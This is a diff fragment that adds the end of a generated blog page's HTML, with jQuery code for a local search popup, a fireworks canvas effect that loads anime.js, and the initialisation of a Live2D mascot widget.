+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
